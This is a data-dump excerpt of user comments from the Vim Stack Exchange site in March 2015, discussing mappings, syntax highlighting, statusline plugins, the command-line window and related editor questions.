  <row Id="2733" PostId="2669" Score="3" Text="Note that this will replace `Set` with `set` *everywhere* in the command line, not just when you type `:Set`" CreationDate="2015-03-22T16:09:23.540" UserId="51" />
  <row Id="2734" PostId="2683" Score="2" Text="Confirmed here; doesn't happen if the file is `.txt`. Some syntax highlight regexp pattern going astray, I suppose." CreationDate="2015-03-22T16:19:46.957" UserId="854" />
  <row Id="2735" PostId="2681" Score="0" Text="Does this work for Ctrl commands too? How should I write them in the command?" CreationDate="2015-03-22T17:05:08.903" UserId="356" />
  <row Id="2736" PostId="2681" Score="0" Text="Yes, it should work.  You can write them like so: `&quot;\&lt;C-{insert key}&gt;&quot;`" CreationDate="2015-03-22T17:58:33.403" UserId="865" />
  <row Id="2737" PostId="2680" Score="0" Text="Just like there is `&lt;C-x&gt;&lt;C-e&gt;` in readline to edit the command-line in `$EDITOR`, you have `&lt;C-f&gt;` in Vim to open the command-line window. See `:help cmdline-window`." CreationDate="2015-03-22T18:09:09.340" UserId="54" />
  <row Id="2738" PostId="2666" Score="0" Text="You can get the current mode via the built-in `mode()` function; there's nothing similar for the typed command (yet)." CreationDate="2015-03-22T18:17:39.487" UserId="970" />
  <row Id="2739" PostId="2684" Score="0" Text="I don't think the OP meant to create mapping for the command line, but to execute a mapping from the command line." CreationDate="2015-03-22T18:50:10.283" UserId="865" />
  <row Id="2740" PostId="2683" Score="0" Text="Since this is syntax highlighting related, the simple workaround would be to set `synmaxcol` to some limited number (such as the width of your terminal)." CreationDate="2015-03-22T19:18:35.410" UserId="1153" />
  <row Id="2741" PostId="2685" Score="0" Text="thanks @Ingo, I've never reported anything before but I'm happy to do so.  I have the syntax file in `/usr/share/vim/vim74/syntax`, the developer at the top is `Neil Schemenauer &lt;nas@python.ca&gt;`. Can I ask you; is this why you changed syntax files originally? Thanks" CreationDate="2015-03-22T19:42:07.930" UserId="1443" />
  <row Id="2742" PostId="2685" Score="0" Text="Yes, that's right; the latest version is from 2014 Jul 16, so it's likely it is still being maintained, and you'll get an answer from the author. You can point him to this, your question, as it already contains a nice reproducible example." CreationDate="2015-03-22T20:31:11.900" UserId="970" />
  <row Id="2743" PostId="2685" Score="0" Text="I just found my alternative Python syntax somewhere somehow; I'm only rarely editing Python files, so I haven't given that much thought so far." CreationDate="2015-03-22T20:32:55.727" UserId="970" />
  <row Id="2744" PostId="2685" Score="0" Text="thanks @Ingo, I've changed the syntax files and it's no longer being so slow. I'm afraid the regex engines are a bit beyond my understanding, I'll email the dev though, I'm happy to carry out any tests." CreationDate="2015-03-22T20:44:55.040" UserId="1443" />
  <row Id="2745" PostId="2687" Score="0" Text="I keep learning how counter-intuitive Vim is!  I didn't notice that `yb` also moves cursor." CreationDate="2015-03-22T21:29:54.720" UserId="1248" />
  <row Id="2746" PostId="2686" Score="0" Text="I overlooked the fact that all backward motions move cursor when used in Operator-pending mode.  Thus the initial title of the question (&quot;Using “search backwards” (`?`) in Operator-pending mode&quot;) is not particularly appropriate.  I hesitate to remove the question, but i will change the title." CreationDate="2015-03-22T22:27:07.560" UserId="1248" />
  <row Id="2747" PostId="2635" Score="0" Text="Thanks, but I downloaded vim 7.4.638 from the cream link (above), and get same error `E344: Can't find directory &quot;H:\&quot; in cdpath`" CreationDate="2015-03-22T23:33:59.143" UserId="1438" />
  <row Id="2748" PostId="2632" Score="0" Text="A good suggestions, but same error message." CreationDate="2015-03-23T00:03:02.983" UserId="1438" />
  <row Id="2750" PostId="2674" Score="0" Text="See also: https://vi.stackexchange.com/questions/598/faster-way-to-move-a-block-of-text" CreationDate="2015-03-23T10:52:10.100" UserId="343" />
  <row Id="2751" PostId="2655" Score="0" Text="Thanks. I just tried this but `:set tw-=2` results in `E487: Argument must be positive: tw-=2`. Is the syntax incorrect?" CreationDate="2015-03-23T11:30:43.723" UserId="91" />
  <row Id="2752" PostId="2689" Score="0" Text="Have you looked into using modelines or filetypes?" CreationDate="2015-03-23T12:09:30.230" UserId="1296" />
  <row Id="2753" PostId="2655" Score="0" Text="Check the current value of textwidth with `:set tw?`. My guess is that you have textwidth set to 0. These steps assume that textwidth starts out as the number of characters you want per line." CreationDate="2015-03-23T14:05:41.607" UserId="680" />
  <row Id="2756" PostId="2702" Score="0" Text="@Carpetsmoker how about the `CursorHold` event? If Vim doesn't have focus, it should trigger every n seconds." CreationDate="2015-03-23T18:13:24.840" UserId="205" />
  <row Id="2757" PostId="2703" Score="0" Text="You look like you want something like [Emmet](http://emmet.io/)." CreationDate="2015-03-23T19:56:07.470" UserId="778" />
  <row Id="2758" PostId="2708" Score="3" Text="You can execute this block regardless of the value of `&amp;diff`. The `Diff*` syntax groups are only used for diff. Furthermore, there's no guarantee that this will be re-evaluated when diff mode is entered interactively." CreationDate="2015-03-23T20:57:46.950" UserId="64" />
  <row Id="2759" PostId="2708" Score="0" Text="@tommcdo: I removed the example stuff. But the re-evaluation stuff I was unaware of (mainly because I don't switch modes, I ether run as vim or as vimdiff)." CreationDate="2015-03-23T21:15:38.983" UserId="383" />
  <row Id="2760" PostId="2707" Score="1" Text="`substitute()` isn't *completely* equivalent to `:substitute`; the function behaves as if `'magic'` is set and `'cpoptions'` is empty, whereas the command will observe user-set values." CreationDate="2015-03-23T22:05:43.053" UserId="64" />
  <row Id="2761" PostId="2467" Score="0" Text="Is it `has(&quot;patch-7.4-399&quot;)` or **`has(&quot;patch-7.4.399&quot;)`**? (the latter was suggested to me by some code-completion, and also seems to be **[what's actually described at the link you provided](http://vimhelp.appspot.com/eval.txt.html#feature-list)**)" CreationDate="2015-03-24T09:49:20.383" UserId="1500" />
  <row Id="2762" PostId="2467" Score="0" Text="@akavel They both work. You could even use `patch-7-4-399` ;-)" CreationDate="2015-03-24T09:50:16.660" UserId="51" />
  <row Id="2764" PostId="2709" Score="0" Text="What do you want to happen if you've both changed the same line?" CreationDate="2015-03-24T11:47:26.350" UserId="51" />
  <row Id="2765" PostId="2467" Score="0" Text="ahh, awsum, then :)" CreationDate="2015-03-24T12:12:12.963" UserId="1500" />
  <row Id="2766" PostId="2703" Score="1" Text="Note that [`:help function-list`](http://vimhelp.appspot.com/usr_41.txt.html#function-list) is a very useful page ;-) There are also some other tags in that page, such as `string-functions`." CreationDate="2015-03-24T13:47:25.760" UserId="51" />
  <row Id="2767" PostId="2714" Score="0" Text="Unforunately not :( as switching to line-wise visual mode gets the opening &lt;div&gt; tag and you end up with:&#xA;&#xA;&#xA;&lt;article&gt;&#xA;  &lt;div&gt;&#xA;    &lt;section&gt;&#xA;    &lt;/section&gt;&#xA;  &lt;/article&gt;&#xA;&lt;/div&gt;" CreationDate="2015-03-24T16:18:11.400" UserId="1503" />
  <row Id="2768" PostId="2714" Score="2" Text="Hmm, the `it` motion seems to behave different depending on the HTML: I've &quot;discovered&quot; 4 different behaviours :-/" CreationDate="2015-03-24T16:23:45.083" UserId="51" />
  <row Id="2769" PostId="2709" Score="0" Text="@Carpetsmoker Hmmm... Hard one.  Maybe it could just pop up a message or something.  I'm open to suggestions on that." CreationDate="2015-03-24T18:20:43.410" UserId="318" />
  <row Id="2771" PostId="2718" Score="0" Text="Oh, you're right, that would check the previously saved version, not so useful. I've changed the command to send the current contents to Perl." CreationDate="2015-03-24T19:08:56.137" UserId="970" />
  <row Id="2772" PostId="2714" Score="1" Text="It works if you start on the section tag rather than on the div tag. Selects inside section, then V to just select those 2 lines. As opposed to selecting inside div, which selects part of the first line as well. Or you can go to the section tag and do `vatVS` to select around the section tag." CreationDate="2015-03-24T21:05:50.667" UserId="1155" />
  <row Id="2773" PostId="2081" Score="1" Text="The patch has been accepted as [7.4.678](https://groups.google.com/forum/#!topic/vim_dev/WLaddu-dXCQ)." CreationDate="2015-03-24T21:45:08.960" UserId="860" />
  <row Id="2774" PostId="2558" Score="0" Text="I found a reproduction: Start with plain text file, create transient window. Change buffer in that window (e.g. `:b1`), switch to other window, close that window. Vim exits. Using a buffer variable does make more sense here; I'm updating the answer to reflect this." CreationDate="2015-03-25T03:57:43.643" UserId="227" />
  <row Id="2776" PostId="2720" Score="0" Text="The advantage of using these worthless gimmicks is exactly to not have to spend time customizing the statusline by simply enabling/disabling features in the plugin. But since we're criticizing these plugins let's be honest here: there's even no need for a statusline to work in vim, so even the comment &quot;read `:h 'statusline'` is unnecessary ;)" CreationDate="2015-03-25T11:53:12.013" UserId="599" />
  <row Id="2777" PostId="2720" Score="2" Text="1. &quot;read :h 'statusline'&quot; implies that the other person wants a custom statusline and shows that there's no need for a plugin for having one. 2. Judging by the number of powerline/airline questions here, on #vim and elsewhere, the shortcut doesn't seem that short." CreationDate="2015-03-25T12:57:53.873" UserId="54" />
  <row Id="2778" PostId="2724" Score="0" Text="Did you [read the doc](https://github.com/kien/ctrlp.vim/blob/master/doc/ctrlp.txt#L178)?" CreationDate="2015-03-25T13:00:10.483" UserId="54" />
  <row Id="2780" PostId="2720" Score="0" Text="With all due respect, I'm not quite satisfied with this community's reception towards my question. This is already a stagnant community as it is (rather it should be growing).&#xA;&#xA;That out of the way, I specifically installed powerline from here: https://github.com/powerline/powerline." CreationDate="2015-03-25T14:23:18.573" UserId="1507" />
  <row Id="2781" PostId="2720" Score="0" Text="@romainl: I did not see an existing tag for Powerline, and searching for Powerline only returned one or two other hits on this SE. And if you're not convinced it isn't Airline, I've tried `:help airline` and it says &quot;Sorry, no help for airline.&quot;" CreationDate="2015-03-25T14:35:04.260" UserId="1507" />
  <row Id="2782" PostId="2720" Score="0" Text="@NicolásKim I'm sorry, we will give you a refund for not satisfactory replying to your question within 10 hours ;-) The problem is that your question provides almost no information at all, you just show us a screenshot and say &quot;it doesn't do what I expect&quot;... Also see: [How do I debug my vimrc file?](https://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file?s=1|1.0147)..." CreationDate="2015-03-25T14:39:22.317" UserId="51" />
  <row Id="2783" PostId="2720" Score="0" Text="@Carpetsmoker Sorry, I'm just used to be more hospitable community on /r/Vim. I guess this SE isn't immune to the overall worshipping of top commenters either—Math.SE is similar. I've added the Vundle command I used to install Lokaltog/powerline in my OP. I've already checked if it's my .vimrc and it isn't; I completely renamed it so my vim can't find it and the Powerline bar is still at the top of the window, unfortunately. I'm running stock vim from homebrew, and I installed Powerline through Vundle. Seems standard enough that this shouldn't happen." CreationDate="2015-03-25T14:43:10.643" UserId="1507" />
  <row Id="2784" PostId="2725" Score="2" Text="Warning about `vim -`: anything sent to stderr is interpreted by vim as a command. To avoid this, you'd want to redirect stderr to stdout: `git log 2&gt;&amp;1 | vim -`" CreationDate="2015-03-25T14:46:25.537" UserId="680" />
  <row Id="2785" PostId="2709" Score="0" Text="But what would be the desired behavior you're expecting? That Vim not just reload the changes but to actually shows something like a desktop popup message or avoid Vim to automatically reloads the changes and shows a warning message instead letting you decide what to do?" CreationDate="2015-03-25T14:50:47.507" UserId="515" />
  <row Id="2786" PostId="2720" Score="1" Text="Romainl is our resident 'tough love vimmer' =P. Nevertheless, the advice he gave you is solid. If you don't have airline installed, then it appears that powerline (or another plugin) has modified your tabline, which always appears at the top. Your status line is currently hidden and can be shown with `set laststatus=2`" CreationDate="2015-03-25T14:54:53.917" UserId="680" />
  <row Id="2787" PostId="2724" Score="0" Text="ctrlp-root-markers might help him as well" CreationDate="2015-03-25T15:06:20.127" UserId="680" />
  <row Id="2788" PostId="2709" Score="0" Text="@JavierScappini Either.  I'm not that picky.  I guess it would be cool to have it automatically load the changes..." CreationDate="2015-03-25T15:22:36.350" UserId="318" />
  <row Id="2789" PostId="2720" Score="0" Text="1. What you see at the top of the window is **NOT** the powerline statusline. It is something else: a fake tabline showing the buffers in the current tab page. 2. To see the actual Powerline tabline, you *must* have `set laststatus` in your `vimrc`. 3. The fake tabline feature was introduced by Airline, maybe it is now in Powerline… who knows? 4. Which one do you use: `lokaltog/powerline` or `powerline/powerline`?" CreationDate="2015-03-25T15:32:56.730" UserId="54" />
  <row Id="2790" PostId="2720" Score="1" Text="@MattBoehm Thanks for the context—it's appreciated. The top bar I was seeing turned out to be from a package called `buftabline`. Setting `laststatus` worked as you and romainl suggested—thanks!" CreationDate="2015-03-25T16:06:19.547" UserId="1507" />
  <row Id="2791" PostId="2720" Score="0" Text="@romainl Setting `laststatus` worked to enable the statusbar as you said. The tabline came from another package called `bufabline`. And I'm using `lokaltog/powerline`. Thanks again!" CreationDate="2015-03-25T16:07:40.920" UserId="1507" />
  <row Id="2792" PostId="2702" Score="1" Text="@muru No, `CursorHold` is executed once only, this is explicitly documented as: *&quot;doesn't fire every 'updatetime' ms if you leave Vim to make some coffee. :)&quot;*" CreationDate="2015-03-25T16:24:30.543" UserId="51" />
  <row Id="2793" PostId="2725" Score="3" Text="`q` is very handy and used to record macros (see `:h q`). You may want to think about a different set of keys for you mapping. Maybe use a `&lt;leader&gt;`. See `:h mapleader`." CreationDate="2015-03-25T16:53:39.087" UserId="778" />
  <row Id="2794" PostId="2717" Score="0" Text="Note that `perl -c` is *not* safe to run on untrusted code." CreationDate="2015-03-25T18:34:19.603" UserId="31" />
  <row Id="2795" PostId="2726" Score="0" Text="Vim also has the `StdinReadPre` and `StdinReadPost` autocmds, which could be used to do this for you automatically. You could also use the `VimEnter` autocmd, but then you can't distinguish between reading from stdin and just typing `vim` with no arguments ([my answer here](http://vi.stackexchange.com/a/715/51) actually does something very similar)." CreationDate="2015-03-25T19:27:51.227" UserId="51" />
  <row Id="2796" PostId="2727" Score="0" Text="Thanks `:CtrlP myproject` was what I needed.  Note to anyone else looking at this, `myproject` is the path to the directory that you want to use as your parent." CreationDate="2015-03-25T20:54:03.667" UserId="697" />
  <row Id="2797" PostId="2717" Score="0" Text="@derobert What do you mean by _untrusted_?" CreationDate="2015-03-25T20:58:40.677" UserId="1111" />
  <row Id="2798" PostId="2717" Score="0" Text="`perl -c` *executes* parts of the passed script. For example, try feeding this through `perl -c`: `BEGIN { print &quot;oh noes\n&quot; }` See the `perlrun` manpage for details." CreationDate="2015-03-25T21:04:11.147" UserId="31" />
  <row Id="2799" PostId="2709" Score="0" Text="My [answer here](http://vi.stackexchange.com/a/2731/51) has some info about the `autoread` setting &amp; it's limitations ... possibly this is also an answer for this question?" CreationDate="2015-03-25T21:05:04.257" UserId="51" />
  <row Id="2800" PostId="2702" Score="0" Text="I removed the [tag:gvim] tag again, I hope that's okay ;-) As I see it, this questions is *not* really *about* gVim, as focus change is just one event on which Vim checks if the file is changed (there are a whole bunch, see my answer for details). Most, if not all, ways to improve on this will work fine in both Vim and gVim." CreationDate="2015-03-25T21:19:11.873" UserId="51" />
  <row Id="2801" PostId="2717" Score="0" Text="@derobert Yes. That is true." CreationDate="2015-03-25T22:09:15.993" UserId="1111" />
  <row Id="2802" PostId="2725" Score="0" Text="I prefer keyboard macros to recordings, and I also use `q` mapped to `exit` in bash, `sys.exit()` in python, and so weiter." CreationDate="2015-03-25T23:21:15.847" UserId="182" />
  <row Id="2803" PostId="2732" Score="0" Text="Where you've said *register*, did you mean *mark*?" CreationDate="2015-03-26T00:08:20.647" UserId="64" />
  <row Id="2804" PostId="2726" Score="0" Text="[WFM](https://github.com/jalanb/dotjab/commit/21581c4b57bc6d3c726a1b3011c24bb423712d85), YMMV" CreationDate="2015-03-26T00:10:23.573" UserId="182" />
  <row Id="2806" PostId="2732" Score="0" Text="Yep, that's what I meant.  I updated the question." CreationDate="2015-03-26T01:05:20.270" UserId="132" />
  <row Id="2807" PostId="2735" Score="1" Text="Since `crontab` typically lifts the value of `EDITOR` or `VISUAL` (if it is defined), you can set them: `EDITOR='VIM_NOBACKUP=1 vim'`." CreationDate="2015-03-26T07:56:07.300" UserId="205" />
  <row Id="2809" PostId="2732" Score="1" Text="Your function will work outside of visual mode anyway so you can probably use `getpos()`. Could you show us what you already have?" CreationDate="2015-03-26T08:13:55.007" UserId="54" />
  <row Id="2810" PostId="2702" Score="0" Text="@Carpetsmoker ah, I was under the impression that gVim checked regularly while it had keyboard focus (thus making it a gVim question), but it appears I was mistaken. Thanks for clearing that up." CreationDate="2015-03-26T08:25:07.757" UserId="1489" />
  <row Id="2811" PostId="2723" Score="0" Text="Try the built-in `:help`, it is a very worthy alternative to google." CreationDate="2015-03-26T11:55:34.143" UserId="54" />
  <row Id="2812" PostId="2736" Score="0" Text="That's exactly what I was looking for, thanks." CreationDate="2015-03-26T13:37:04.947" UserId="132" />
  <row Id="2813" PostId="2735" Score="0" Text="@muru I've tried, but I don't think it works. `crontab -e` generates `crontab: VIM_NOBACKUP=1 vim: No such file or directory`." CreationDate="2015-03-26T14:07:30.213" UserId="467" />
  <row Id="2814" PostId="2735" Score="1" Text="Must be an OSX thing, because it works on Arch Linux and Ubuntu, bash and zsh." CreationDate="2015-03-26T14:10:35.237" UserId="205" />
  <row Id="2815" PostId="2723" Score="0" Text="@romainl How do you use `:help` to get CJK font settings? I would like to know :)" CreationDate="2015-03-26T14:42:40.873" UserId="1315" />
  <row Id="2816" PostId="2709" Score="0" Text="Have you considered using a [version control system](http://en.wikipedia.org/wiki/Revision_control) to manage the shared files?" CreationDate="2015-03-26T14:44:42.187" UserId="13" />
  <row Id="2817" PostId="2735" Score="1" Text="All the mucking about with environment variables is silly; Vim has a way to deal with file-specific settings, and it's called autocmds. It looks like you just copied this from the link, but it seems that the author of that is not very familiar with Vim." CreationDate="2015-03-26T14:58:36.043" UserId="51" />
  <row Id="2818" PostId="2735" Score="0" Text="@Carpetsmoker Thanks. I've re-arranged the solutions, so the easier one comes first. I've left environment variables just for reference/alternative way of doing it. `crontab.*` is enough, as `crontab -e` generates random files like `/tmp/crontab.X`." CreationDate="2015-03-26T15:18:41.593" UserId="467" />
  <row Id="2819" PostId="2735" Score="1" Text="Why include it at all? It's a silly way of doing things, and there's almost never a reason to not use an autocmd. When we remove that, we are left with just the autocmd, which is the same answer which has been here for over a month and a half. This answer adds nothing but noise." CreationDate="2015-03-26T15:32:39.017" UserId="51" />
  <row Id="2820" PostId="2626" Score="0" Text="Using `:cd F:/` and `:cd F:\ ` (I don't have a `H:`) works for me on Windows 7 with Vim 7.4 with no patches (as downloaded from www.vim.org)... I can't reproduce this problem.... :-/" CreationDate="2015-03-26T15:42:30.513" UserId="51" />
  <row Id="2821" PostId="2735" Score="0" Text="@Carpetsmoker Some people could have different problems and alternative solution could work or they just prefer this way. In example first part could not work if you've `vi` linked to `vim` (which you didn't include). And this is completely different answer to yours, so I don't get your point. Secondly in your answer you're changing inodes instead which is your reason to not use autocmd, which for me it only does the noise. Two different options/opinions are always good, unless you want to monopolize both Q&amp;A." CreationDate="2015-03-26T15:46:52.117" UserId="467" />
  <row Id="2822" PostId="2744" Score="2" Text="I don't see this problem. I used: `gvim /home/martin`, and then tried both selecting `../` with the keyboard (Enter) and clicking on it with the mouse. I go up a directory, and in this new directory `../` is selected again. Perhaps the problem is something in your vimrc file? Try [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2015-03-26T15:47:42.543" UserId="51" />
  <row Id="2823" PostId="2108" Score="0" Text="Related: [Open several files in new tabs with VIM](http://stackoverflow.com/questions/11430361/open-several-files-in-new-tabs-with-vim) at Stack Overflow." CreationDate="2015-03-26T15:49:45.370" UserId="1528" />
  <row Id="2824" PostId="2723" Score="0" Text="`:help guifont` and scroll around." CreationDate="2015-03-26T15:55:57.440" UserId="54" />
  <row Id="2825" PostId="2744" Score="0" Text="That is intersting.. it even happens with `vim -U NONE`" CreationDate="2015-03-26T15:59:49.717" UserId="489" />
  <row Id="2826" PostId="2744" Score="0" Text="Ah, I forgot to mention that I've enabled the file tree setting.. see the edited question" CreationDate="2015-03-26T16:03:03.607" UserId="489" />
  <row Id="2827" PostId="2743" Score="0" Text="You also need to fix the syntax highlighting (for some reason), as explained in the link and close the last tab, so the 'full' command would be: `:tabnew | args file1 file2 | argdo tabe | tabdo syntax on` The you need press Enter to clear the prompt and type `:close` to remove the last (empty) tab ... it's an awful lot of typing, and only worth it if you're opening a lot of tabs (for 2 or 3 files, just using `:tabe` twice would be faster)." CreationDate="2015-03-26T16:04:18.967" UserId="51" />
  <row Id="2828" PostId="2744" Score="1" Text="I can reproduce the problem when setting `let g:netrw_liststyle=3` ;-) By the way: `vim -U NONE` prevents loading the gvimrc file, *not* the vimrc file. You need to use `vim -u NONE` ;-)" CreationDate="2015-03-26T16:07:20.467" UserId="51" />
  <row Id="2830" PostId="2635" Score="0" Text="@ChestertheRooster I have a similar setup at work and `:cd H:\\` works fine for me. Are you sure the network drive is mounted?" CreationDate="2015-03-26T18:13:09.703" UserId="15" />
  <row Id="2831" PostId="2752" Score="0" Text="The first solution works great. The second solution didn't work for me, probably because the version of vi I am using is 3.10" CreationDate="2015-03-27T02:42:05.993" UserId="763" />
  <row Id="2832" PostId="413" Score="0" Text="@alxndr Yup. It works great! There's a full set of instructions here: http://stevelosh.com/blog/2012/10/a-modern-space-cadet/" CreationDate="2015-03-27T08:32:42.477" UserId="343" />
  <row Id="2833" PostId="2742" Score="2" Text="While @toro2k answered OP's question directly, this answer solves the problem more appropriately. It's kind of an [XY problem](http://xyproblem.info)." CreationDate="2015-03-27T08:49:40.373" UserId="64" />
  <row Id="2834" PostId="2758" Score="0" Text="I'm not 100% sure what you want, maybe a real example would help (what you have vs. what you want). Are you aware of gv? It reselects the last visual selection and might be of help here." CreationDate="2015-03-27T09:02:27.897" UserId="1296" />
  <row Id="2835" PostId="2759" Score="0" Text="Yep, exactly what I was looking for." CreationDate="2015-03-27T10:04:44.247" UserId="1542" />
  <row Id="2836" PostId="2759" Score="0" Text="And thanks for teaching me the `&lt;kbd&gt;`-tags. (two answers in one.)" CreationDate="2015-03-27T10:05:58.787" UserId="1542" />
  <row Id="2837" PostId="2755" Score="0" Text="Solution 2 only works in Visual Line mode, though." CreationDate="2015-03-27T11:40:54.127" UserId="88" />
  <row Id="2838" PostId="2762" Score="0" Text="That's always an option, I am just looking to see if it's possible to set colour according to the context." CreationDate="2015-03-27T13:55:35.547" UserId="1479" />
  <row Id="2839" PostId="2762" Score="0" Text="I don't think that is usefull, but you can detect if the search pattern (on / or  #) is the same as the word under cursor and change the Cursor highlight" CreationDate="2015-03-27T14:10:58.843" UserId="177" />
  <row Id="2840" PostId="2766" Score="0" Text="You can paste into the command line with `&lt;Ctrl-R&gt;`  followed by the name of the register you want to paste from (e.g. `*` for the Windows clipboard.)" CreationDate="2015-03-27T15:40:06.233" UserId="343" />
  <row Id="2841" PostId="2766" Score="0" Text="Actually I can paste into the commandline with Ctrl-V but copying from it is harder. Specifically it's hard to copy or paste just part of it." CreationDate="2015-03-27T15:44:03.323" UserId="878" />
  <row Id="2842" PostId="2767" Score="0" Text="I guess I don't know my Vim jargon. Is something called the &quot;command-line window&quot; that is not the single line at the bottom of Vim where I type commands? \-:" CreationDate="2015-03-27T15:47:41.690" UserId="878" />
  <row Id="2843" PostId="2766" Score="0" Text="Ah okay. `&lt;Ctrl-R&gt;` is still good to know about, though, because a). it works everywhere (`Ctrl-V` does something completely different for me), and b). it works for other registers too." CreationDate="2015-03-27T15:47:59.620" UserId="343" />
  <row Id="2844" PostId="2767" Score="4" Text="For searches started with `/`, you'd want to use `q/` instead of `q:`" CreationDate="2015-03-27T15:49:06.893" UserId="680" />
  <row Id="2845" PostId="2767" Score="0" Text="@hippietrail No, that's the command line. As @romainl suggests, you should read `:help cmdline-window`. (Or just try it out!)" CreationDate="2015-03-27T15:49:42.423" UserId="343" />
  <row Id="2846" PostId="2766" Score="0" Text="Yes I know they made compromises with copypaste on Windows so it could use its normal keystrokes and the functions which were tied to those keystrokes on other OSes got moved in Windows. That's why I originally included the windows tag in my question ..." CreationDate="2015-03-27T15:50:53.163" UserId="878" />
  <row Id="2847" PostId="2767" Score="0" Text="Oh so you're saying that rather than edit the regex as though it were a file I should edit the whole commandline as though it were a file?" CreationDate="2015-03-27T15:52:09.197" UserId="878" />
  <row Id="2848" PostId="2767" Score="1" Text="If you type `q/` instead of `/` vim will open a new window with your search history that you can edit as if it were a file." CreationDate="2015-03-27T15:57:31.357" UserId="680" />
  <row Id="2849" PostId="2766" Score="0" Text="@hippietrail How to copy/paste from the command line in Windows, and how to *&quot;edit a regular expression search string as if it were a file&quot;* are really 2 different questions ;-) It's a good topic for a *second* question." CreationDate="2015-03-27T16:00:27.630" UserId="51" />
  <row Id="2850" PostId="2766" Score="0" Text="Well yes. The abstract problem is &quot;I want to copy and past subexpressions in regexes in the vim commandline&quot; and one specific approach is &quot;if I knew a way to edit the regex as if it were a file I could solve my abstract problem&quot;." CreationDate="2015-03-27T16:07:39.120" UserId="878" />
  <row Id="2851" PostId="2767" Score="0" Text="@MattBoehm: Aha! This part about `q/` should be in the answer then." CreationDate="2015-03-27T16:08:22.937" UserId="878" />
  <row Id="2852" PostId="2767" Score="1" Text="The answer would be better too if it somehow introduced the concept and/or jargon &quot;command-line&quot; window&quot; since I suppose others will be like me in that though they've used Vim for years never had to use this feature before." CreationDate="2015-03-27T16:14:09.377" UserId="878" />
  <row Id="2853" PostId="2767" Score="1" Text="Everything you need to know about the command-line window is in the relevant documentation." CreationDate="2015-03-27T16:15:47.773" UserId="54" />
  <row Id="2854" PostId="2767" Score="0" Text="Except explaining why something called a command line window is a place for editing regexes. I would go for something like &quot;There's a feature you should learn about called the 'command line window' where you can edit commands, and regexes are treated as a kind of 'command'.&quot; I see the docs use the term &quot;search string&quot; too which can help skimming for just the info I need for this problem." CreationDate="2015-03-27T16:23:43.130" UserId="878" />
  <row Id="2855" PostId="2766" Score="1" Text="@hippietrail It feels more to me (and I presume @Carpetsmoker) that the abstract problem is &quot;I want to be able to edit regular expressions more powerfully&quot; and two *different* specific approaches to this are 1. Copy/paste in the commandline 2. Edit the regex as if it's a file." CreationDate="2015-03-27T16:24:03.983" UserId="343" />
  <row Id="2856" PostId="2766" Score="1" Text="Well that's a generalization of my problem I suppose (-: The specific power was long subparts of search strings used more than one, but the full power of an edit buffer seemed like something I thought must be in Vim though my Googling failed probably because I didn't know the key jargon... Ah I see the specific part about reusing subexpressions was edited out..." CreationDate="2015-03-27T16:27:23.847" UserId="878" />
  <row Id="2857" PostId="2767" Score="1" Text="You were given all the info you need to solve the problem in your question. If you want to know more about that feature and your curiosity is not satisfied by `:help cmdline-window` feel free to ask another — hopefully more specific — question." CreationDate="2015-03-27T16:29:18.177" UserId="54" />
  <row Id="2858" PostId="2767" Score="0" Text="Yes my problem is solved, for which I thank you all. I hope it will be more Googleable to anyone else with similar problems coming after me and not knowing the jargon. My question was more specific in its original form but was edited to be less specific. Anyway thanks again." CreationDate="2015-03-27T16:34:37.783" UserId="878" />
  <row Id="2859" PostId="2766" Score="1" Text="Both the title and the question itself ask *&quot;How can I edit a regular expression search string as if it were a file?&quot;* ;-) The Windows copy/paste thing just seemed like an off-hand remark to me. You can always revert my edit, or make more edits to your question ;-)" CreationDate="2015-03-27T17:40:49.457" UserId="51" />
  <row Id="2860" PostId="2766" Score="0" Text="I'll leave it. On some SE sites they just want your core question. On others they want you to provide backstory to show how it's really a problem you're facing." CreationDate="2015-03-27T17:50:52.037" UserId="878" />
  <row Id="2861" PostId="2765" Score="0" Text="Thank you for the answer." CreationDate="2015-03-27T17:58:45.100" UserId="307" />
  <row Id="2862" PostId="2754" Score="0" Text="I had tried this before (but forgot until now). It's pretty good, but it means that there will only ever be one match per line (the last possible match). I'd still like a line like `pouty puppet` to yield two matches." CreationDate="2015-03-27T18:00:15.620" UserId="64" />
  <row Id="2863" PostId="2770" Score="0" Text="Works great. I will be using this from now. I will try to implement the persistent one sometime later." CreationDate="2015-03-27T18:02:09.167" UserId="1479" />
  <row Id="2864" PostId="2752" Score="0" Text="After using the first solution here some, I realized that it flops when there are inner pairs of brackets." CreationDate="2015-03-27T19:28:19.057" UserId="763" />
  <row Id="2865" PostId="2752" Score="0" Text="Indeed it does.  It is a very simple solution, so I figured there would be some disadvantage to it.  I'll see what I can do to make it work, but it might end up being extremely complex." CreationDate="2015-03-27T19:32:52.087" UserId="865" />
  <row Id="2866" PostId="2769" Score="2" Text="This help excerpt mentions the `'hidden'` option, which may help with some of the oddness you described in your original question. Using `:set hidden` allows you to hide buffers even if they haven't been written to disk. For me, this setting was the tipping point towards mastering buffer navigation, moving away from a mess of splits and tabs." CreationDate="2015-03-28T00:18:09.590" UserId="64" />
  <row Id="2867" PostId="2765" Score="0" Text="From what I can see, using `p` in a terminal buffer does not enter Terminal mode, so the following `&lt;C-\&gt;&lt;C-N&gt;` should not be necessary. (That said, it's also totally harmless.)" CreationDate="2015-03-28T00:27:59.027" UserId="64" />
  <row Id="2868" PostId="2740" Score="2" Text="As asked, and based on the fact that you've chosen [toro2k's answer](http://vi.stackexchange.com/a/2741/64), this question is actually not related to filenames at all; it could be repurposed as a general question about matching regular expressions in VimScript. On the other hand, it feels like an [XY problem](http://xyproblem.info/), and [Carpetsmoker's answer](http://vi.stackexchange.com/a/2742/64) does a great job of addressing what I believe you were actually trying to accomplish." CreationDate="2015-03-28T00:36:37.923" UserId="64" />
  <row Id="2869" PostId="2765" Score="0" Text="@tommcdo good call, hadn't tried the feature myself yet so was just taking a shot. I'll remove that part." CreationDate="2015-03-28T04:32:41.900" UserId="680" />
  <row Id="2870" PostId="2740" Score="0" Text="@tommcdo I've re-edited the question for more general purpose as suggested and toro2k answer say exactly how to write regular expression condition (as per main question). The other answer deals only with specific case and focus on autocmd and filename, but it doesn't answer the main question (how to write simple regular expression condition), that's why I've chosen toro2k answer (which is more appropriate in this case)." CreationDate="2015-03-28T11:05:41.230" UserId="467" />
  <row Id="2871" PostId="2769" Score="0" Text="@tommcdo nice one.  I'll give that a go" CreationDate="2015-03-28T12:06:10.567" UserId="1518" />
